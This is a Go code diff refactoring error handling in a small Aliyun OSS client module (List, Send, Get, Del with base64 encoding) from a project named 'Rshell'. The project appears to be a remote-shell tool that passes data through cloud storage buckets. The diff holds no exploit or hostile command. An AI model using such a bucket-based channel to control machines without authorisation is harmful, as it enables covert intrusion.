@@ -3,10 +3,10 @@ package oss
 import (
 	"Rshell/pkg/encrypt"
 	"Rshell/pkg/logger"
-	"github.com/aliyun/aliyun-oss-go-sdk/oss"
 	"io/ioutil"
-	"os"
 	"strings"
+
+	"github.com/aliyun/aliyun-oss-go-sdk/oss"
 )
 
 type Client struct {
@@ -47,16 +47,13 @@ func InitClient(endPoint, accessKeyId, accessKeySecret, bucketName string) error
 	}
 	return nil
 }
-func List(c *Client) []oss.ObjectProperties {
-
+func List(c *Client) ([]oss.ObjectProperties, error) {
 	lsRes, err := c.Bucket.ListObjects(oss.MaxKeys(3), oss.Prefix(""))
 	if err != nil {
 		logger.Error("Error:", err)
-		os.Exit(-1)
+		return nil, err
 	}
-	//fmt.Println(lsRes)
-	return lsRes.Objects
-
+	return lsRes.Objects, nil
 }
 func Send(c *Client, name string, content []byte) {
 	encodeData, err := encrypt.EncodeBase64(content)
@@ -71,28 +68,26 @@ func Send(c *Client, name string, content []byte) {
 
 }
 func Get(c *Client, name string) []byte {
-	//fmt.Println(name)
 	body, err := c.Bucket.GetObject(name)
 	if err != nil {
 		return nil
 	}
 	// 数据读取完成后，获取的流必须关闭，否则会造成连接泄漏，导致请求无连接可用，程序无法正常工作。
 	defer body.Close()
-	// println(body)
 	data, err := ioutil.ReadAll(body)
 	if err != nil {
 		logger.Error("Error:", err)
-		os.Exit(-1)
+		return nil
 	}
-	//fmt.Println(string(data))
 	decodeData, err := encrypt.DecodeBase64(data)
 	return decodeData
 }
 
-func Del(c *Client, name string) {
+func Del(c *Client, name string) error {
 	err := c.Bucket.DeleteObject(name)
 	if err != nil {
-		panic(err)
+		logger.Error("Error deleting object:", name, err)
+		return err
 	}
-
+	return nil
 }
